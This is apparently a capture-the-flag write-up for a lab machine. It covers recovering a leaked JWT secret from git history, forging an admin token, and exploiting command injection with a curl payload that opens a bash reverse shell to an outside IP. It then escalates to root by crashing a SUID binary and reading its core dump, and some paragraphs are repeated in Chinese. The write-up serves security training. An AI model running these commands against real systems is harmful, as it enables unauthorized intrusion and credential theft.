1,Enumerate 
ports scan:
	22/tcp ssh
	80/tcp http Nginx 1.18.0
	3000/tcp http Node.js

enumerate the web pages of port 80:
![](images/Pasted%20image%2020240721054724.png)
The configurations may be very attractive
but nothing there, but we found the docs (documents of tech), it gives us about to register and login user.
# Introduction Last updated: 2019-06-01

This is a API based Authentication system. we are using "JWT" tokens to make things more secure. to store the user data we are using mongodb, you can find a demo of how the api works in [here](http://10.10.11.120/api) this is a very secured Authentication system will well done documentation ( sometimes companies hide endpoints ) but our code is public

![](images/Pasted%20image%2020240721062903.png)
it is clear that http://localhost:3000/api/priv help server to check auth of admins

And we can also download the source code.
from .git file,we can get credit dasithsv@gmail.com 

	git log --oneline

![](images/Pasted%20image%2020240721062316.png)
	67d8da7 removed .env for security reasons
it seems very interesting because of security reasons!
we get :
	 `DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
	`-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE`
	`+TOKEN_SECRET = secret`

This token would be exploited, let's try it!

We have known "using JWT tokens to make things more secure"
So we try to decode the token of documents
	``   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg`

![](images/Pasted%20image%2020240721064825.png)
We sucessfully cracked it.

From log.js
![](images/Pasted%20image%2020240721064938.png)
It has command injection in 
	`if (name == 'theadmin'){
        `const getLogs = git log --oneline ${file};
        `exec(getLogs, (err , output) =>{

So we need to make name == 'theadmin'
![](images/Pasted%20image%2020240721065843.png)

try to exploit the command injection
	`curl -s -G 'http://10.10.11.120/api/logs' --data-urlencode "file=>/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.16.8/4444 0>&1'" -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq -r .`
then we can get reverse shell !

2,Shell as root
upload pspy64 to check background applications, but nothing happened.

Enumerate the templates of machine
there is nothing attactive in the root /, but in /opt there are some interesting things.
![](images/Pasted%20image%2020240721071257.png)
count is a SUID binary, which means it will run as it’s owner regardless of who runs it. In this case, that user is root. Running it prompts for a filename:

The intended path to exploit this binary is to abuse the file descriptors in use by the count process. The issue in the source code is that it never closes file, which is the handle to the given filepath. That means that as long as the program is running, the handle will be in /proc/[pid]/fd. Typically this would be flushed on the setuid, but because of PR_SET_DUMPABLE, the file handles will stay open. To exploit this, I’ll run the program, and then background it when it gets to the prompt:
利用此二进制文件的预期路径是滥用 count 进程使用的文件描述符。源代码中的问题是它永远不会关闭 file ，它是给定文件路径的句柄。这意味着只要程序正在运行，句柄就会位于 /proc/[pid]/fd 中。通常这会在 setuid 上刷新，但由于 PR_SET_DUMPABLE ，文件句柄将保持打开状态。为了利用这一点，我将运行该程序，然后在出现提示时将其置于后台

	`./count check /root/root.txt crtl+z`
	`ps auxww | grep count  find the count process`
	`cd /proc/*/fd/`
	`check it`
we cannot directly check it because of "cat: 3: Permission denied"

![](images/Pasted%20image%2020240721072724.png)
we found only root can read it and there are .ssh doc and .viminfo to inspire us.

There’s a comment in the source // Enable coredump generation. That’s a good hint to try generating a crash of the process. When a program crashes, the system stores the crash dump files in /var/crash. There’s actually already two there:
源代码中有一条注释 // Enable coredump generation 。这是尝试生成进程崩溃的一个很好的提示。当程序崩溃时，系统将故障转储文件存储在 /var/crash 中。实际上已经有两个了

The kill command is typically associated with killing processes, but what it actually does is send a specified signal to a process, and the default signal is TERM (making the default behavior to kill the process). kill -l will show all the possible signals:
kill 命令通常与杀死进程相关联，但它实际上做的是向进程发送指定的信号，默认信号是 TERM （默认行为是杀死进程）过程）。 kill -l 将显示所有可能的信号

SIGSEGV is the signal to send a segmentation fault, which will crash the program. I’ll send it, and then resume the program with fg:
SIGSEGV 是发送分段错误的信号，这将使程序崩溃。我将发送它，然后使用 fg 恢复程序

There’s a new file in /var/crash
![](images/Pasted%20image%2020240721075949.png)

It has all kinds of information about the process at the time of the crash, and a large base-64 encoded blob at the end.
它包含有关崩溃时进程的各种信息，以及末尾的大型 Base-64 编码 blob。

apport-unpack will decompress the dump into a given directory:
apport-unpack 将把转储解压缩到给定目录：

	`apport-unpack _opt_count.1000.crash /tmp/`
	`file CoreDump` file shows CoreDump as an ELF binary
	`strings -n 30 CoreDump`

That’s because it’s the memory of the process at the time of the crash. Running strings on it will return the file:
那是因为它是崩溃时进程的内存。在其上运行字符串将返回文件

Finally we get ssh private key from .viminfo
then use it to get root flag.